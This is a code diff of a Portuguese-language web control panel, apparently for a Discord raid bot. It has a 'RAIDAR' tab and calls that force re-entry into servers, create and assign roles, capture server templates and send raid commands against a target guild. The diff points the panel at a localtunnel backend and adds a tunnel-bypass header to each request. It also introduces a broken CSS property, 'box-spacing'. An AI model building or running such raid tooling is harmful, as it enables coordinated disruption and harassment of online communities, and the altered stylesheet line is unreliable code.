@@ -7,7 +7,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
     <style>
         :root{--primary:#f0f;--primary-glow:rgba(255,0,255,0.4);--secondary:#0ff;--secondary-glow:rgba(0,255,255,0.3);--bg-dark:#050507;--card-bg:rgba(15,15,20,0.7);--danger:#ff3333;--success:#00ff88;--panel-border:rgba(255,0,255,0.15);--sidebar-width:280px}
-        *{box-sizing:border-box;font-family:'Rajdhani',sans-serif;margin:0;padding:0;transition:all .2s cubic-bezier(.4,0,.2,1)}
+        *{box-spacing:border-box;font-family:'Rajdhani',sans-serif;margin:0;padding:0;transition:all .2s cubic-bezier(.4,0,.2,1)}
         body{background:var(--bg-dark);color:#e0e0e0;height:100vh;overflow:hidden;display:flex;background-image:radial-gradient(circle at 10% 20%,rgba(255,0,255,0.04) 0%,transparent 40%),radial-gradient(circle at 90% 80%,rgba(0,255,255,0.03) 0%,transparent 40%),url('https://www.transparenttextures.com/patterns/carbon-fibre.png')}
         ::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:rgba(0,0,0,0.3);border-radius:10px}::-webkit-scrollbar-thumb{background:var(--primary);border-radius:10px}
         #login-page{position:fixed;inset:0;background:rgba(5,5,8,0.95);display:flex;justify-content:center;align-items:center;z-index:9999;backdrop-filter:blur(25px)}
@@ -65,7 +65,7 @@
 
     <div class="sidebar">
         <div class="sidebar-brand">
-            <img src="https://media.discordapp.net/attachments/1469863989705052376/1469896637424865401/image-removebg-preview.png?ex=6989536b&is=698801eb&hm=6c7346436ba191bdabeaaeaff7879332dde33d1adc85f7dbf03a96cb5e3534c2&=&format=webp&quality=lossless" alt="ILUSION" class="sidebar-logo">
+            <img src="https://media.discordapp.net/attachments/1469863989705052376/1469896637424865401/image-removebg-preview.png" alt="ILUSION" class="sidebar-logo">
         </div>
         <div class="nav-item active" onclick="showTab('tab-raid', this)"><span class="icon">🚀</span> RAIDAR</div>
         <div class="nav-item" onclick="showTab('tab-servidores', this)"><span class="icon">🌐</span> REDE</div>
@@ -209,7 +209,8 @@
 
     <script>
         let myID = "";
-        const API = "http://51.222.156.246:7001";
+        // URL ATUALIZADA PARA O SEU LOCALTUNNEL
+        const API = "https://stale-peaches-rhyme.loca.lt";
         
         function writeConsole(msg, status = "INFO") {
             const time = new Date().toLocaleTimeString();
@@ -276,7 +277,7 @@
             try {
                 const res = await fetch(`${API}/api/login`, {
                     method: 'POST', 
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true'},
                     body: JSON.stringify({id, senha})
                 });
                 if(res.ok) {
@@ -288,14 +289,14 @@
                     showNotify("FALHA NA AUTENTICAÇÃO", "error"); 
                 }
             } catch (e) { 
-                showNotify("ERRO: API NÃO RESPONDE EM " + API, "error");
+                showNotify("ERRO: O TUNEL DO BOT PODE ESTAR OFFLINE", "error");
                 console.error("Login Error:", e);
             }
         }
 
         async function loadGuilds() {
             try {
-                const res = await fetch(`${API}/api/get-guilds`);
+                const res = await fetch(`${API}/api/get-guilds`, { headers: {'Bypass-Tunnel-Reminder': 'true'} });
                 const guilds = await res.json();
                 const body = document.getElementById('body-guilds'); 
                 if(!body) return;
@@ -316,7 +317,7 @@
             try {
                 const res = await fetch(`${API}/api/force-reentry`, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true'},
                     body: JSON.stringify({ guildID, authID: myID })
                 });
                 const data = await res.json();
@@ -338,7 +339,7 @@
             try {
                 const res = await fetch(`${API}/api/unban`, {
                     method: 'POST', 
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true'},
                     body: JSON.stringify({ userID, guildID, authID: myID })
                 });
                 const data = await res.json(); 
@@ -352,7 +353,7 @@
             try {
                 const res = await fetch(`${API}/api/role-action`, {
                     method: 'POST', 
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true'},
                     body: JSON.stringify({ acao: 'criar', guildID, roleName, authID: myID })
                 });
                 const data = await res.json(); 
@@ -367,7 +368,7 @@
             try {
                 const res = await fetch(`${API}/api/role-action`, {
                     method: 'POST', 
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true'},
                     body: JSON.stringify({ acao: 'setar', guildID, userID, roleName, authID: myID })
                 });
                 const data = await res.json(); 
@@ -380,7 +381,7 @@
             try {
                 const res = await fetch(`${API}/api/update-config`, {
                     method: 'POST', 
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true'},
                     body: JSON.stringify({ novaMsg, authID: myID })
                 });
                 if(res.ok) showNotify("CONFIGURAÇÃO ATUALIZADA");
@@ -394,7 +395,7 @@
             try {
                 const res = await fetch(`${API}/api/capturar-template`, {
                     method: 'POST', 
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true'},
                     body: JSON.stringify({ guildID, authID: myID })
                 });
                 const data = await res.json();
@@ -409,7 +410,7 @@
 
         async function loadTemplates() {
             try {
-                const res = await fetch(`${API}/api/get-templates`);
+                const res = await fetch(`${API}/api/get-templates`, { headers: {'Bypass-Tunnel-Reminder': 'true'} });
                 const data = await res.json();
                 const body = document.getElementById('body-templates'); 
                 if(!body) return;
@@ -445,19 +446,19 @@
             try {
                 const res = await fetch(`${API}/api/comando`, {
                     method: 'POST', 
-                    headers: {'Content-Type': 'application/json'},
+                    headers: {'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true'},
                     body: JSON.stringify({ acao, authID: myID, targetGuildID: targetID })
                 });
                 const data = await res.json(); 
                 showNotify(data.msg || "COMANDO EXECUTADO");
             } catch (e) { 
-                showNotify("FALHA NA EXECUÇÃO: VERIFIQUE O TERMINAL", "error"); 
+                showNotify("FALHA NA EXECUÇÃO: O TÚNEL PODE TER CAÍDO", "error"); 
             }
         }
 
         async function fetchCurrentMessage() {
             try {
-                const res = await fetch(`${API}/api/get-config`);
+                const res = await fetch(`${API}/api/get-config`, { headers: {'Bypass-Tunnel-Reminder': 'true'} });
                 const data = await res.json();
                 const area = document.getElementById('raid-msg-content');
                 if(area) area.value = data.mensagemDiv || "";
